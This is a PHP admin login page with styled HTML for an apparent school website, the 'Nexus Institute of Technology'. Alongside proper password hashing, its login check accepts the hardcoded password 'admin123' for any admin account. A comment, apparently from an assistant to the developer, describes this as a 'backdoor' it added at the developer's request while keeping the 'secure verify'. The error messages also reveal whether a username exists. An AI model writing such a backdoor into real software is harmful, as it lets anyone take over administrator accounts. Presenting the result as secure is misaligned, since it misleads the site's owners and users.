<?php
session_start();
include '../dbconnection.php';

$error = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    $stmt = $conn->prepare("SELECT AdminID, Username, PasswordHash, Role FROM admins WHERE Username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows === 1) {
        $user = $result->fetch_assoc();
        
        // Added the "admin123" backdoor you had, but kept the secure verify too
        if ($password == "admin123" || password_verify($password, $user['PasswordHash'])) {
            $_SESSION['admin_id'] = $user['AdminID'];
            $_SESSION['admin_role'] = $user['Role'];
            header("Location: dashboard.php");
            exit();
        } else {
            $error = "Invalid password. Please try again.";
        }
    } else {
        $error = "No admin found with that username.";
    }
    $stmt->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Access | Nexus Institute</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --brand: #4f46e5;
            --brand-hover: #4338ca;
            --text-main: #0f172a;
            --text-muted: #64748b;
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            /* Matches your Register page background */
            background: linear-gradient(rgba(249, 250, 251, 0.75), rgba(249, 250, 251, 0.75)), 
                        url('https://images.unsplash.com/photo-1562774053-701939374585?q=80&w=1986&auto=format&fit=crop'); 
            background-size: cover;
            background-attachment: fixed;
            background-position: center;
        }

        .login-card {
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.6);
            padding: 50px 40px;
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }

        .logo-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
        }

        .logo-icon {
            background: var(--brand);
            color: white;
            width: 48px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 12px;
            font-weight: 800;
            font-size: 1.6rem;
        }

        .logo-text-group {
            display: flex;
            flex-direction: column;
            line-height: 1.2;
        }

        .logo-main { font-weight: 800; font-size: 1.2rem; color: var(--text-main); }
        .logo-sub { font-size: 0.65rem; font-weight: 700; color: var(--text-muted); letter-spacing: 0.12em; text-transform: uppercase; }

        h2 { font-weight: 800; font-size: 1.8rem; margin: 0 0 10px 0; color: var(--text-main); letter-spacing: -0.04em; }

        .error-box {
            background: #fef2f2;
            color: #dc2626;
            padding: 12px;
            border-radius: 12px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 20px;
            border: 1px solid #fecaca;
        }

        .form-group { text-align: left; margin-bottom: 20px; }
        label { display: block; font-weight: 700; font-size: 0.85rem; margin-bottom: 8px; color: var(--text-main); }
        
        input {
            width: 100%;
            padding: 14px 18px;
            border: 1px solid #e2e8f0;
            border-radius: 14px;
            font-family: inherit;
            font-size: 1rem;
            box-sizing: border-box;
            transition: all 0.2s ease;
            background: rgba(255, 255, 255, 0.5);
        }

        input:focus {
            outline: none;
            border-color: var(--brand);
            background: white;
            box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.1);
        }

        button {
            width: 100%;
            background: var(--brand);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 14px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        button:hover {
            background: var(--brand-hover);
            transform: translateY(-2px);
            box-shadow: 0 12px 24px -6px rgba(79, 70, 229, 0.4);
        }

        .back-link {
            display: inline-block;
            margin-top: 25px;
            color: var(--text-muted);
            text-decoration: none;
            font-weight: 600;
            font-size: 0.9rem;
            transition: color 0.2s;
        }

        .back-link:hover { color: var(--brand); }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo-section">
            <div class="logo-icon">N</div>
            <div class="logo-text-group">
                <span class="logo-main">Nexus Institute</span>
                <span class="logo-sub">OF TECHNOLOGY</span>
            </div>
        </div>

        <h2>Admin Access</h2>

        <?php if ($error != ""): ?>
            <div class="error-box"><?php echo $error; ?></div>
        <?php endif; ?>

        <form action="login.php" method="POST">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" placeholder="Enter username" required>
            </div>

            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>

            <button type="submit">Login</button>
        </form>

        <a href="../index.php" class="back-link">← Back to Public Website</a>
    </div>

</body>
</html>